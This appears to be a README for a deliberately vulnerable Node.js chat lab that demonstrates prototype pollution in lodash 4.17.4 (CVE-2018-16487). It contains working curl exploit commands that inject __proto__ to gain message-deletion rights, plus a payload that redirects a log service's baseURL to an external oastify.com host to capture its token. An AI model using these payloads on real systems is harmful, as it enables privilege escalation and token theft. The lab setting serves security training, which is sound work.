## Chat

This is example chat server vulnerable to Prototype Pollution.

- `GET /` - List all messages (available without authentication).
  ```bash
  curl --request GET --url http://localhost:3000/
  ```
- `PUT /` - Post a new message (only registered users).
  ```bash
  curl --request PUT \
    --url http://localhost:3000/ \
    --header 'content-type: application/json' \
    --data '{"auth": {"name": "user", "password": "pwd"}, "message": {"text": "Hi!"}}'
  ```
- `DELETE /` - Delete a message (only administrators).
  ```bash
  curl --request DELETE \
    --url http://localhost:3000/ \
    --header 'content-type: application/json' \
    --data '{"auth": {"name": "admin", "password": "???"}, "messageId": 2}'
  ```

An attacker target here is to delete message without administrator credentials.

#### Run

- `npm install`
- `npm start`

#### Vulnerability

The Prototype Pollution vulnerability (CVE-2018-16487) introduced
by [lodash@4.17.4](https://www.npmjs.com/package/lodash/v/4.17.4) via `_.merge()` function. More details about the issue
you can find on [Snyk website](https://snyk.io/vuln/SNYK-JS-LODASH-73638).

[https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad](https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad)

#### How To Exploit

1. Send evil message with `__proto__`.
   ```bash
   curl --request PUT \
     --url http://localhost:3000/ \
     --header 'content-type: application/json' \
     --data '{"auth": {"name": "user", "password": "pwd"}, "message": { "text": "😈", "__proto__": {"canDelete": true}}}'
   ```
2. Delete any message you want using user's credentials.
   ```bash
   curl --request DELETE \
     --url http://localhost:3000/ \
     --header 'content-type: application/json' \
     --data '{"auth": {"name": "user", "password": "pwd"}, "messageId": 1}'
   ```

### Hijacking Log Service Token

```
{"auth": {"name": "user", "password": "pwd"}, "message": {"text": "Hi!",
"__proto__": {
"canDelete": true,
"baseURL": "http://s81hehdn4fnv8n5ezwo4209syj4as2gr.oastify.com"
}}
}
```

## Second Challenge: DOM-based XSS

https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution

